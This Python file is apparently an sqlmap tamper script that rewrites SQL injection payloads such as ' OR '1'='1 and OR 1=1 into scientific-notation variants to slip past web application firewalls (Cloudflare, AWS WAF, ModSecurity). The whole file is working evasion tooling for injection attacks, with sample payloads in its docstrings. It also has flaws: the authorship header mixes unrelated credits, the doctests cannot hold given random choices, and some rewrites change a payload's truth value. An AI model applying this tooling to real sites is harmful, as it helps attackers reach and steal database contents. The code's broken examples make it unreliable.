#!/usr/bin/env python

# Author: CyberVaca , Luis Vacas de Santos
# Twitter: https://twitter.com/CyberVaca_
# Based on the Alamot's original code

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

import re
import random

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.HIGHEST

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Uses scientific notation (e notation) to bypass WAF pattern matching

    Requirement:
        * MySQL, PostgreSQL, MSSQL (partial support)

    Tested against:
        * Cloudflare WAF
        * AWS WAF
        * ModSecurity CRS
        * Nginx WAF

    Notes:
        * Scientific notation like 1337.e("") or 0e0 can bypass WAF rules
        * WAFs often look for patterns like "OR 1=1" but not "OR 1337.e('')=1337.e('')"
        * The .e("") syntax is valid in MySQL and evaluates correctly
        * This technique was popularized by @ptswarm

    Reference:
        * https://www.gosecure.net/blog/2021/10/19/a-scientific-notation-bug-in-mysql-left-aws-waf-clients-vulnerable-to-sql-injection/
        * https://twitter.com/ptswarm (Tips to know - e notation bypass)

    >>> tamper("' OR '1'='1")
    "' OR 1337.e('')='1"
    >>> tamper("1 OR 1=1")
    "1 OR 1337.e('')=1337.e('')"
    """

    if not payload:
        return payload

    retVal = payload
    
    # Scientific notation variants for obfuscation
    e_notations = [
        "1337.e('')",
        "1337.e(\"\")",
        "0e0",
        "1e0",
        "1.e('')",
        "0.e('')",
        "9e0",
        "1337e0",
    ]
    
    # Pattern: OR '1'='1' or OR "1"="1" -> OR 1337.e('')='1'
    # This is the exact technique from ptswarm's image
    retVal = re.sub(
        r"(\bOR\s+)['\"](\d+)['\"](\s*=\s*)['\"](\d+)['\"]",
        lambda m: "%s%s%s'%s'" % (m.group(1), random.choice(e_notations), m.group(3), m.group(4)),
        retVal,
        flags=re.IGNORECASE
    )
    
    # Pattern: OR 1=1 -> OR 1337.e('')=1337.e('')
    retVal = re.sub(
        r"(\bOR\s+)(\d+)(\s*=\s*)(\d+)",
        lambda m: "%s%s%s%s" % (m.group(1), random.choice(e_notations), m.group(3), random.choice(e_notations)),
        retVal,
        flags=re.IGNORECASE
    )
    
    # Pattern: AND 1=1 -> AND 1337.e('')=1337.e('')
    retVal = re.sub(
        r"(\bAND\s+)(\d+)(\s*=\s*)(\d+)",
        lambda m: "%s%s%s%s" % (m.group(1), random.choice(e_notations), m.group(3), random.choice(e_notations)),
        retVal,
        flags=re.IGNORECASE
    )
    
    # Pattern: =1 at end -> =1337.e('')
    retVal = re.sub(
        r"=(\d+)(\s*)$",
        lambda m: "=%s%s" % (random.choice(e_notations), m.group(2)),
        retVal
    )
    
    # Pattern: standalone numbers in comparisons
    # Be careful not to break LIMIT, OFFSET, etc.
    retVal = re.sub(
        r"(\s+)(\d+)(\s*)(=|<|>|<=|>=|<>|!=)(\s*)(\d+)",
        lambda m: "%s%s%s%s%s%s" % (
            m.group(1), 
            random.choice(e_notations) if random.random() > 0.5 else m.group(2),
            m.group(3), 
            m.group(4), 
            m.group(5),
            random.choice(e_notations) if random.random() > 0.5 else m.group(6)
        ),
        retVal
    )

    return retVal


def tamper_aggressive(payload, **kwargs):
    """
    More aggressive scientific notation that replaces more patterns
    May break some payloads but has higher bypass rate
    """
    
    if not payload:
        return payload
    
    retVal = payload
    
    # Replace all standalone numbers with scientific notation
    # Except those following LIMIT, OFFSET, TOP, etc.
    
    e_notations = ["1337.e('')", "0e0", "1e0", "1.e('')"]
    
    # Replace numbers in equality checks
    retVal = re.sub(
        r"(?<![A-Za-z_])(\d+)(?=\s*=)",
        lambda m: random.choice(e_notations),
        retVal
    )
    
    retVal = re.sub(
        r"(?<==\s*)(\d+)(?![A-Za-z_])",
        lambda m: random.choice(e_notations),
        retVal
    )
    
    return retVal


def tamper_mysql_specific(payload, **kwargs):
    """
    MySQL-specific scientific notation bypass using .e("") syntax
    This is the exact technique shown in ptswarm's tip
    """
    
    if not payload:
        return payload
    
    retVal = payload
    
    # The key insight from ptswarm:
    # ' or "=' is blocked
    # ' or 1337.e("")=' bypasses
    
    # Replace quoted comparisons with e-notation
    retVal = re.sub(
        r"['\"](\s*)(=)\s*['\"]",
        r"1337.e('')\1\2'",
        retVal
    )
    
    # Replace OR "string" patterns
    retVal = re.sub(
        r"(\bOR\s+)['\"][^'\"]*['\"]",
        lambda m: m.group(1) + "1337.e('')",
        retVal,
        flags=re.IGNORECASE
    )
    
    return retVal


def tamper_zero_e(payload, **kwargs):
    """
    Uses 0e0 notation which equals 0 but bypasses pattern matching
    Useful for: OR 0e0 (which is OR 0, always false but tests injection)
    """
    
    if not payload:
        return payload
    
    retVal = payload
    
    # Replace 0 with 0e0
    retVal = re.sub(r"\b0\b", "0e0", retVal)
    
    # Replace 1 with 1e0  
    retVal = re.sub(r"\b1\b", "1e0", retVal)
    
    return retVal
